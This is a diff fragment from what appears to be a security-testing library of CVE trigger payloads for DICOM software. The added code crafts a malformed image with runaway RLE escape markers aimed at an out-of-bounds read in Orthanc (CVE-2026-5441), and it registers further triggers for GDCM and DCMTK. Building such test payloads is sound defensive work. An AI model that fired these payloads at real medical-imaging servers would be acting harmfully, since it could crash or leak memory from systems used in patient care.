+                      'target_field': 'embedded PAM WIDTH/HEIGHT'}
+        ))
+
+        # CVE-2026-5441: Philips PMSCT_RLE1 proprietary compression. Structural
+        # trigger — the private creator + compression marker steer Orthanc into
+        # DecodePsmctRle1, with crafted escape markers near the buffer end.
+        rle_escape = b'\xa5\x5a' * 8 + b'\x00\xa5'  # escape-marker run, truncated
+        elems = [
+            Element(0x0028, 0x0002, 'US', 1),
+            Element(0x0028, 0x0004, 'CS', 'MONOCHROME2'),
+            Element(0x0028, 0x0010, 'US', 8),
+            Element(0x0028, 0x0011, 'US', 8),
+            Element(0x0028, 0x0100, 'US', 16),
+            Element(0x0028, 0x0101, 'US', 16),
+            Element(0x0028, 0x0102, 'US', 15),
+            Element(0x0028, 0x0103, 'US', 0),
+            # Philips ELSCINT1 private block declaring PMSCT_RLE1 compression.
+            Element.raw(tag=0x07a10010, vr='LO', value=b'ELSCINT1'),
+            Element.raw(tag=0x07a11011, vr='LO', value=b'PMSCT_RLE1'),
+            Element.raw(tag=0x7FE00010, vr='OW', value=rle_escape),
+        ]
+        results.append(AttackResult(
+            name='cve_2026_5441_01_pmsct_rle1_escape_markers',
+            category='cve',
+            payload=CVEAttacks._image_part10(CVEAttacks._ds_bytes(elems), EXPLICIT_LE),
+            description='Philips PMSCT_RLE1 private compression with escape '
+                        'markers running off the end of the buffer',
+            expected_behavior='DecodePsmctRle1 must bound escape-marker reads to '
+                              'the buffer',
+            metadata={'cve': 'CVE-2026-5441', 'product': 'Orthanc',
+                      'cve_batch': 'CVE-2026-5437..5445', 'bug_class': 'oob-read',
+                      'target_func': 'DicomImageDecoder::DecodePsmctRle1',
+                      'target_field': '(07a1,1011) PMSCT_RLE1 + Pixel Data',
+                      'note': 'structural trigger'}
+        ))
+
+        return results
+
     @classmethod
     def all(cls) -> Generator[AttackResult, None, None]:
         """Yield every CVE attack payload (flattened from lists)."""
@@ -2631,6 +3278,18 @@ class CVEAttacks:
         yield from cls.cve_2025_14607_bytestring_corruption()
         yield from cls.cve_2024_47796_determine_minmax_oob()
         yield from cls.cve_2015_8979_dul_string_overflow()
+        # GDCM codec CVEs (Talos) — crafted-.dcm pixel/codec triggers.
+        yield from cls.cve_2024_22391_gdcm_lut_setlut()
+        yield from cls.cve_2024_25569_gdcm_rawcodec_oob()
+        yield from cls.cve_2025_48429_gdcm_rle_numsegments()
+        yield from cls.cve_2024_22373_gdcm_jpeg2000_oob()
+        yield from cls.cve_2025_52582_gdcm_overlay_oob()
+        yield from cls.cve_2025_11266_gdcm_encapsulated_fragment_underflow()
+        yield from cls.cve_2015_8396_gdcm_imageregionreader_int_overflow()
+        # DCMTK dcmpstat type confusion (Talos).
+        yield from cls.cve_2024_28130_dcmtk_voi_lut_type_confusion()
+        # Orthanc image-decoder batch (CERT/CC VU#536588).
+        yield from cls.cve_2026_5441_5445_orthanc_image_decoder()
 
 
 # =============================================================================
